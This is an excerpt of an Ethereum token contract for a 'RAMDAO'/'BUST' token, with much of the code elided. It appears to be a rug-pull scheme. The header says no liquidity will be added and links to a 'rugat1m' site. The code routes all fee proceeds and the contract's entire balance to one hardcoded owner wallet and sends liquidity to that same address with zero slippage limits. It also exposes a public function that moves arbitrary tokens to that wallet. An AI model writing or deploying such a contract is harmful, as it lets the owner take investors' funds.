...
/**
 *   DAO Token, no LP will be added
 *      TG:   https://t.me/RAMportal
 *      Web:    https://rugat1m.tech
 *      Twitter:    https://twitter.com/rugat1m
 *   
 *   Main contract is available at https://etherscan.io/address/0x628df6fbc6b7fc5fccba0c1408aef5d242ea9784
 */
...
contract RAMDAO is Context, IERC20 { 
    ...
    address payable public Wallet_collaterals = payable(0xAa286fed357193069D6119BE3C21E756a3F4B482); 
    ...
    string private constant _name = "BUST"; 
    ...
    uint256 public _maxWalletToken = _tTotal * 100;
    ...
    constructor () {
        ...
        _owner = 0xAa286fed357193069D6119BE3C21E756a3F4B482;
        ...
        _isExcludedFromFee[Wallet_collaterals] = true; 
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(Wallet_collaterals, BNB_M);

            BNB_Total = address(this).balance;
            sendToWallet(Wallet_collaterals, BNB_Total);
    ...
    function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
        ...
        uniswapV2Router.addLiquidityETH{value: BNBAmount}(
            ...
            0, 
            0,
            address(0xAa286fed357193069D6119BE3C21E756a3F4B482), 
            block.timestamp
        );
    } 
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(Wallet_collaterals, removeRandom);
